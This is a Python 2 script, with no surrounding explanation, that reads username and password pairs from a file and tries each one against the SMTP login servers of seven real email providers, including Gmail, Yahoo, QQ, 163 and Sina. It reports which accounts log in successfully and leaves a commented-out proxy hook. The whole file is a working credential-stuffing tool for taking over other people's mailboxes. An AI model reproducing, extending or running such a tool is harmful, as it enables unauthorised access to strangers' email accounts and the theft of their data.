import smtplib
import urllib,urllib2,cookielib,socket
   
def SmtpLogin(server,name,password):

    try:
        svr = smtplib.SMTP(server,timeout=10)

        if svr!=None :
            try:
                svr.login(name,password)
                print name,"Login Success.\n"
                svr.quit()
            except:
                print name,"Login Failed.\n"
                svr.quit()
    except smtplib.SMTPException,e:
        print e
        
def SmtpTLS(server,username,password):
    try:
        svr = smtplib.SMTP(server,25,timeout=10)
        svr.set_debuglevel(0)               
        svr.docmd("EHLO server")
        svr.starttls()         
        try:
            svr.login(username,password)
            print username,"Login Success.\n"
            svr.quit()
        except:
            print username,"Login Failed.\n"
            svr.quit()
        
    except smtplib.SMTPException,e:
        print e
def SmtpSSL(server,username,password):
    try:
        svr = smtplib.SMTP_SSL(server,465,timeout=10)
        svr.set_debuglevel(0)               
        svr.ehlo_or_helo_if_needed()
             
        try:
            svr.login(username,password)
            print username,"Login Success.\n"
            svr.quit()
        except:
            print username,"Login Failed.\n"
            svr.quit()
        
    except smtplib.SMTPException,e:
        print e
        
def main():
   
    Mail={'qq':'smtp.qq.com','163':'smtp.163.com','yahoo':'smtp.mail.yahoo.com','sina':'smtp.sina.com.cn','gmail':'smtp.gmail.com','live':'smtp.live.com','sohu':'smtp.sohu.com'}
    
    f=open('info.txt','r')
    for line in f:
        line=line.strip('\n')
        username=line.split(' ')[0]
        password=line.split(' ')[1]
        
        for i in Mail:
            name=username
            #TLS
            if (i=="yahoo" or i=="gmail" or i=="sohu"):
                name=name+"@"+i+".com"
                SmtpTLS(Mail[i],name,password)
            #SSL    
            elif(i=='qq'):                
                SmtpSSL(Mail[i],name,password)
                
            #SMTP    
            else:
                name=name+"@"+i+".com"
                SmtpLogin(Mail[i],name,password)
    f.close()
     
if __name__ == "__main__":

   # UseProxy()   
     main()
   
    
 
